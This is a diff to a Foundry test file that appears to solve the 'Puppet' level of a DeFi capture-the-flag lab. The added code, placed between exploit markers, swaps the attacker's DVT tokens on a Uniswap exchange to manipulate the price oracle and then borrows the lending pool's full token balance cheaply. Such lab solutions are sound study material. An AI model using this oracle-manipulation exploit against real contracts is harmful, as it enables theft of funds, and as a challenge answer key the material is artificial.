@@ -101,6 +101,19 @@ contract Puppet is Test {
          * EXPLOIT START *
          */
 
+        vm.startPrank(attacker);
+        // Make ETH over valued by trading 1000 DVT for 10 ETH
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 10, block.timestamp + 10000);
+
+        uint ethRequirements = (puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
+
+        puppetPool.borrow{value: ethRequirements}(POOL_INITIAL_TOKEN_BALANCE);
+
+        vm.stopPrank();
+
+
+
         /**
          * EXPLOIT END *
          */
